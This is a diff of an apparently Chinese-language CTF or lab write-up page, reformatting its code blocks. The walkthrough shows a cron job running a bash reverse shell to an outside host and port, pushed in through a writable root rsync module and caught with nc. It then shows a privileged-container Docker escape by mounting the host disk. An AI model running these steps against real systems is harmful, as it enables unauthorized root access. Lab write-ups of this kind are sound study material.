-backup.sh  shell  shell.sh  <span class="pl-c1">test</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@www:/backup# ls
+backup.sh  shell  shell.sh  test
 root@www:/backup# cat shell
-<span class="pl-k">*</span> <span class="pl-k">*</span> <span class="pl-k">*</span> <span class="pl-k">*</span> <span class="pl-k">*</span> root sh /tmp/shell.sh
+* * * * * root sh /tmp/shell.sh
 root@www:/backup# cat shell.sh
-<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
-bash -i <span class="pl-k">&gt;&amp;</span> /dev/tcp/172.20.0.3/2333 <span class="pl-k">0&gt;&amp;1</span>
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/172.20.0.3/2333 0&gt;&amp;1
 
 root@www:/backup# rsync -a shell.sh rsync://backup:873/src/tmp/shell.sh
 root@www:/backup# rsync rsync://backup:873/src/tmp/shell.sh
@@ -2232,17 +2252,18 @@ root@www:/backup# rsync rsync://backup:873/src/etc/cron.d/shell
 root@www:/backup# nc -lvnp 2333
 listening on [any] 2333 ...
 connect to [172.20.0.3] from (UNKNOWN) [172.20.0.2] 41556
-bash: cannot <span class="pl-c1">set</span> terminal process group (504): Inappropriate ioctl <span class="pl-k">for</span> device
-bash: no job control <span class="pl-k">in</span> this shell
-root@backup:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span>id</span>
+bash: cannot set terminal process group (504): Inappropriate ioctl for device
+bash: no job control in this shell
+root@backup:~#id
 uid=0(root) gid=0(root) groups=0(root)
-root@backup:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> ls -al /.doc*</span>
-ls -al /.doc<span class="pl-k">*</span>
+root@backup:~# ls -al /.doc*
+ls -al /.doc*
 -rwxr-xr-x 1 root root 0 May  4  2018 /.dockerenv
-</pre></div>
+
+</code></pre>
 <h3>docker逃逸</h3>
 <p>可以看到还是个docker，现证实下猜想</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@backup:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /etc/rsyncd.conf</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@backup:~# cat /etc/rsyncd.conf
 cat /etc/rsyncd.conf
 uid = root
 gid = root
@@ -2255,11 +2276,13 @@ log file = /var/log/rsyncd.log
 [src]
 path = /
 comment = src path
-<span class="pl-c1">read</span> only = no</pre></div>
+read only = no
+</code></pre>
 <p>其实列一下dev就可以看出来是不是特权容器了，特权容器dev下文件很多，非特权就几个</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">ls /dev</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">ls /dev
+</code></pre>
 <p>可以看到主设备是sda2，挂载逃逸即可</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@backup:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> df -h</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@backup:~# df -h
 df -h
 Filesystem      Size  Used Avail Use% Mounted on
 overlay         5.3G  4.1G  1.2G  78% /
@@ -2268,23 +2291,25 @@ tmpfs           997M     0  997M   0% /sys/fs/cgroup
 /dev/sda2       5.3G  4.1G  1.2G  78% /backup
 shm              64M     0   64M   0% /dev/shm
 
-root@backup:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> mkdir /mnt/evil</span>
+root@backup:~# mkdir /mnt/evil
 mkdir /mnt/evil
-root@backup:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> mount /dev/sda2 /mnt/evil</span>
-mount /dev/sda2 /mnt/evil</pre></div>
+root@backup:~# mount /dev/sda2 /mnt/evil
+mount /dev/sda2 /mnt/evil
+</code></pre>
 <p>这个时候已经可以使用root和主机交互了，不过仍然是docker的root不是主机的root，不过拿主机root就很简单了，没开ssh，写个定时任务继续弹shell即可</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@backup:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> ls -al /mnt/evil/root</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@backup:~# ls -al /mnt/evil/root
 ls -al /mnt/evil/root
 total 32
-drwx------  5 root root 4096 Dec  6 06:51 <span class="pl-c1">.</span>
+drwx------  5 root root 4096 Dec  6 06:51 .
 drwxr-xr-x 23 root root 4096 Dec  6  2023 ..
-lrwxrwxrwx  1 root root    9 Jul 16  2018 .bash_history -<span class="pl-k">&gt;</span> /dev/null
+lrwxrwxrwx  1 root root    9 Jul 16  2018 .bash_history -&gt; /dev/null
 -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
 drwx------  2 root root 4096 Jul 15  2018 .cache
 drwx------  3 root root 4096 Dec  6  2023 .gnupg
 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
 drwx------  2 root root 4096 Jul 15  2018 .ssh
--r--------  1 root root   33 Dec  6 06:51 root.txt</pre></div>
+-r--------  1 root root   33 Dec  6 06:51 root.txt
+</code></pre>
 <p>拿下</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/428daf56-152b-4b4a-9c50-87726bc47334"><img width="2000" height="1438" alt="Image" src="https://github.com/user-attachments/assets/428daf56-152b-4b4a-9c50-87726bc47334" style="max-width: 100%; height: auto; max-height: 1438px;"></a></p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
@@ -2311,7 +2336,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 let themeSettings={
@@ -2385,70 +2410,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 
